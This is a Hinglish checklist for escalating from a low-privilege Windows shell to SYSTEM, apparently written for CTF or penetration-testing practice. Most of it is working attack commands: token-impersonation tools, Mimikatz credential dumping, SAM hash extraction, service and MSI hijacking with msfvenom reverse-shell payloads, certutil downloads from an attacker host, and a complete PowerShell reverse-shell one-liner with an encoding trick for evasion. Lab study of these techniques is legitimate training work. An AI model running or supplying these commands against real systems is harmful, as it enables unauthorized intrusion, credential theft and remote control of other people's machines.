# WINDOWS PRIVILEGE ESCALATION CHECKLIST — User Se SYSTEM Tak

---

## Ye Kya Hai?
Windows machine pe low-privilege shell mila (user ya service account) — ab SYSTEM (highest
privilege) banana hai. Windows privesc Linux se different hai — yahan privileges, services,
registry, aur stored credentials pe focus hota hai.

**Golden Rule:** `whoami /priv` pehle check karo, phir services/registry, kernel exploit last.

---

## CHECK 1: Current User Info — Pehle Apni Aukaat Jaano

```cmd
whoami                              REM Kaun hu main
whoami /priv                        REM Mere privileges kya hain (MOST IMPORTANT!)
whoami /groups                      REM Kin groups mein hu
net user                            REM Saare local users
net user %username%                 REM Apni detail
net localgroup administrators       REM Admin group members
systeminfo                          REM OS version, hotfixes (patches), architecture
```

### systeminfo Output Mein Kya Dekh:
```
OS Name: Microsoft Windows 7 Professional       <- Old OS = more exploits
OS Version: 6.1.7601 Service Pack 1
Hotfix(s): 2 Hotfix(s) Installed               <- Kam patches = vulnerable
    [01]: KB2534111
```
Kam hotfixes = zyada vulnerabilities!

---

## CHECK 2: Dangerous Privileges — Ye Mile Toh Party Hai

```cmd
whoami /priv
```

### Output Samjho:
```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeImpersonatePrivilege        Impersonate a client           Enabled   <- DANGER!
SeAssignPrimaryTokenPrivilege Replace a process level token  Enabled   <- DANGER!
```

| Privilege | Exploit | Tool | Command |
|---|---|---|---|
| **SeImpersonatePrivilege** | Token impersonation | PrintSpoofer | `PrintSpoofer.exe -i -c cmd` |
| **SeImpersonatePrivilege** | Potato attack | JuicyPotato | `JuicyPotato.exe -l 1337 -p cmd.exe -t *` |
| **SeImpersonatePrivilege** | Latest potato | GodPotato | `GodPotato.exe -cmd "cmd /c whoami"` |
| **SeAssignPrimaryTokenPrivilege** | Token manipulation | JuicyPotato | Same as above |
| **SeBackupPrivilege** | Backup SAM/SYSTEM | reg save | `reg save HKLM\SAM sam.bak` + `reg save HKLM\SYSTEM sys.bak` |
| **SeDebugPrivilege** | Process injection | Mimikatz | LSASS dump kar sakta hai |
| **SeRestorePrivilege** | File overwrite | DLL hijack | System files overwrite possible |

### SeImpersonatePrivilege Kya Hai — Detail Mein:
Ye privilege service accounts (IIS, SQL) ko milta hai. Iska matlab hai ki ye account
doosre user ka "impersonate" (nakal) kar sakta hai — including SYSTEM! PrintSpoofer aur
JuicyPotato isi ka fayda uthate hain.

```bash
# PrintSpoofer (Windows 10/Server 2016+):
PrintSpoofer.exe -i -c cmd
# -i = interactive, -c = command to run
# Seedha SYSTEM shell milega!

# JuicyPotato (Windows 7/Server 2008):
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
# -l = listening port, -p = program, -t = createprocess technique
# CLSID system ke hisaab se change karna padta hai
```

**Upload kaise karo target pe:**
```bash
# Meterpreter se:
meterpreter > upload /path/to/PrintSpoofer.exe C:\\Temp\\PrintSpoofer.exe
meterpreter > shell
C:\Temp\PrintSpoofer.exe -i -c cmd

# Ya PowerShell se:
certutil -urlcache -f http://YOUR_IP:8888/PrintSpoofer.exe C:\Temp\PrintSpoofer.exe
```

---

## CHECK 3: Meterpreter Shortcuts (Agar Meterpreter Hai)

```bash
# Auto privesc (multiple techniques try karta hai):
meterpreter > getsystem
# [+] Got system via technique 1 = Success!
# [-] Operation failed = Doosre checks karo

# Mimikatz load karo:
meterpreter > load kiwi
meterpreter > creds_all             # Saare credentials (cleartext bhi!)
meterpreter > creds_msv             # NTLM hashes
meterpreter > creds_wdigest         # WDigest cleartext passwords
meterpreter > creds_kerberos        # Kerberos tickets

# Hash dump:
meterpreter > hashdump
# Administrator:500:aad3b435...:NTLM_HASH:::

# Local exploit suggester:
meterpreter > background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
# Ye batayega kaunse exploits kaam kar sakte hain
```

### getsystem Fail Ho Jaye Toh?
- Privilege check karo (`whoami /priv`)
- SeImpersonatePrivilege hai? -> PrintSpoofer
- local_exploit_suggester run karo
- Manual checks karo (neeche padho)

---

## CHECK 4: Unquoted Service Paths — Sneaky Exploit

### Kya Hai Ye?
Jab Windows service ka path quotes mein nahi hota AUR path mein spaces hain:
```
C:\Program Files\My App\Service\app.exe        <- Unquoted + spaces = VULNERABLE
"C:\Program Files\My App\Service\app.exe"      <- Quoted = safe
```

### Kyu Vulnerable Hai:
Windows unquoted path ko aise parse karta hai (order mein try karta hai):
```
1. C:\Program.exe                   <- pehle ye try karega
2. C:\Program Files\My.exe          <- phir ye
3. C:\Program Files\My App\Service\app.exe <- last mein ye
```
Agar tu `C:\Program Files\My.exe` rakh de (jahan write permission hai) -> Windows
pehle TERA program chalayega service ke bajaye -> SYSTEM shell (agar service SYSTEM se chalti hai)!

### Find Karo:
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```
Output mein unquoted paths with spaces dhundho.

### Writable Directory Check:
```cmd
icacls "C:\Program Files\My App"
# (BUILTIN\Users:(OI)(CI)(F)) = Full control = WRITABLE!
```

### Exploit:
```bash
# msfvenom se payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o My.exe

# Upload to: C:\Program Files\My.exe
# Restart service:
sc stop "ServiceName"
sc start "ServiceName"
# Ya reboot: shutdown /r /t 0
```

---

## CHECK 5: Writable Service Binaries

```cmd
# Service details:
sc qc <SERVICE_NAME>
# Look for: BINARY_PATH_NAME and SERVICE_START_NAME (LocalSystem = SYSTEM!)

# AccessChk (Sysinternals tool):
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Users" *
# SERVICE_ALL_ACCESS ya SERVICE_CHANGE_CONFIG = EXPLOITABLE
```

### Exploit:
```cmd
REM Service binary change karo:
sc config "VulnService" binpath= "C:\Temp\reverse_shell.exe"
REM NOTE: binpath= ke baad space zaroori hai!

sc stop "VulnService"
sc start "VulnService"
REM Reverse shell milegi SYSTEM ke roop mein!
```

---

## CHECK 6: Scheduled Tasks

```cmd
schtasks /query /fo TABLE /nh
schtasks /query /fo LIST /v         REM Detailed view

REM Writable task scripts dhundho:
REM Task ki script ka path dekho
icacls "C:\path\to\task_script.bat"
REM Writable? Replace with payload!
```

### Exploit:
Agar koi scheduled task SYSTEM se chalti hai aur uski script writable hai:
```cmd
echo C:\Temp\reverse_shell.exe > C:\path\to\task_script.bat
REM Next run pe SYSTEM shell milegi
```

---

## CHECK 7: Registry AutoRun

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
**Kya dekh:** Ye programs startup pe chalte hain. Agar kisi ka binary writable hai ->
replace with payload -> next login pe execute hoga.

```cmd
REM Check if binary is writable:
icacls "C:\path\to\autorun.exe"
REM Writable? Replace karo!
```

---

## CHECK 8: AlwaysInstallElevated — MSI Se SYSTEM

### Kya Hai Ye?
Agar ye registry keys DONO 1 pe set hain, toh koi bhi user MSI package SYSTEM
privileges se install kar sakta hai!

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
**Dono mein `0x1` aaya?** Jackpot!

### Exploit:
```bash
# MSI reverse shell banao (apni machine pe):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o evil.msi

# Upload to target
# Target pe execute:
msiexec /quiet /qn /i C:\Temp\evil.msi
# /quiet = no UI, /qn = no UI at all, /i = install
# SYSTEM reverse shell milegi!
```

**Kyu kaam karta hai:** Windows Installer ko admin ne galti se elevated privileges de rakhe
hain — toh non-admin bhi SYSTEM jaisa install kar sakta hai.

---

## CHECK 9: Stored Credentials (cmdkey)

```cmd
cmdkey /list
```
### Output:
```
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
**Matlab:** Administrator ke credentials saved hain! Use karo:

```cmd
runas /savecred /user:Administrator cmd.exe
REM Bina password type kiye Administrator ka CMD milega!

runas /savecred /user:Administrator "C:\Temp\reverse_shell.exe"
REM Ya reverse shell as Administrator
```

---

## CHECK 10: SAM and SYSTEM Backup Files

### SAM Kya Hai?
SAM (Security Account Manager) Windows ka password hash database hai. Normally locked
hota hai, lekin backup copies accessible ho sakti hain!

```cmd
REM Common backup locations:
dir /s /b C:\Windows\repair\SAM
dir /s /b C:\Windows\repair\SYSTEM
dir /s /b C:\Windows\System32\config\RegBack\SAM
dir /s /b C:\Windows\System32\config\RegBack\SYSTEM

REM Ya registry se:
reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\sys.bak
```

### Hash Extract Karo (Apni Machine Pe):
```bash
# Files download karo (Meterpreter se ya SMB se)
# Phir:
samdump2 SYSTEM SAM
# Ya:
impacket-secretsdump -sam sam.bak -system sys.bak LOCAL
# NTLM hashes milenge -> crack karo ya Pass-the-Hash
```

---

## CHECK 11: WinPEAS — Automated Scanner

```cmd
REM Upload winpeas:
certutil -urlcache -f http://YOUR_IP:8888/winPEASx64.exe C:\Temp\winPEASx64.exe
C:\Temp\winPEASx64.exe

REM Ya PowerShell se:
powershell -c "Invoke-WebRequest -Uri 'http://YOUR_IP:8888/winPEASx64.exe' -OutFile 'C:\Temp\wp.exe'"
C:\Temp\wp.exe
```

### WinPEAS Output Samjho:
- **RED text** = Almost certainly exploitable
- **YELLOW text** = Worth investigating
- Pehle RED items pe focus karo
- Ye sabhi manual checks automatically karta hai

---

## BONUS: PowerShell Tricks

```powershell
# PowerShell reverse shell:
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

# Download file:
powershell -c "Invoke-WebRequest -Uri 'http://YOUR_IP:8888/file.exe' -OutFile 'C:\Temp\file.exe'"

# Encoded command (bypass karne ke liye):
# Apni machine pe encode:
echo -n 'IEX(command here)' | iconv -t UTF-16LE | base64
# Target pe:
powershell -enc <BASE64_STRING>
```

---

## Common Mistakes (Mat Karna Ye)

1. **whoami /priv skip karna** — SeImpersonatePrivilege = instant SYSTEM via PrintSpoofer
2. **getsystem fail pe ruk jaana** — Manual checks karo, local_exploit_suggester use karo
3. **Unquoted service path mein writable check nahi karna** — Path unquoted hai lekin write nahi kar sakta = useless
4. **AlwaysInstallElevated mein sirf ek key check karna** — DONO keys 1 honi chahiye
5. **cmdkey /list bhool jaana** — Stored creds se seedha admin shell mil sakta hai
6. **SAM backup dhundhna bhool jaana** — repair folder mein aksar milte hain
7. **32-bit payload 64-bit machine pe** — Architecture match karo: `systeminfo` se check
8. **Linux commands Windows mein daalna** — `cat` nahi `type`, `ls` nahi `dir`, `grep` nahi `findstr`

---

## Quick Decision Tree

```
Windows low-privilege shell mili
  |
  1. whoami /priv
  |   +-- SeImpersonatePrivilege? --> PrintSpoofer/JuicyPotato --> SYSTEM!
  |   +-- SeBackupPrivilege? --> SAM/SYSTEM copy --> hash extract
  |
  2. Meterpreter hai?
  |   +-- getsystem --> worked? DONE!
  |   +-- Failed? --> load kiwi --> creds_all
  |   +-- local_exploit_suggester run karo
  |
  3. cmdkey /list
  |   +-- Saved creds? --> runas /savecred --> Admin shell!
  |
  4. AlwaysInstallElevated check
  |   +-- Dono keys 1? --> msfvenom MSI --> msiexec --> SYSTEM!
  |
  5. Unquoted service paths
  |   +-- Found + writable? --> payload place karo --> restart service
  |
  6. Writable service binaries
  |   +-- Found? --> Replace binary --> restart --> SYSTEM!
  |
  7. Scheduled tasks
  |   +-- SYSTEM task + writable script? --> Replace --> wait
  |
  8. SAM backup files
  |   +-- Found? --> Download --> samdump2 --> hash crack/PtH
  |
  9. WinPEAS chala do (sab ek saath)
  |
  +-- SYSTEM MILA --> type C:\Users\Administrator\Desktop\flag.txt
```
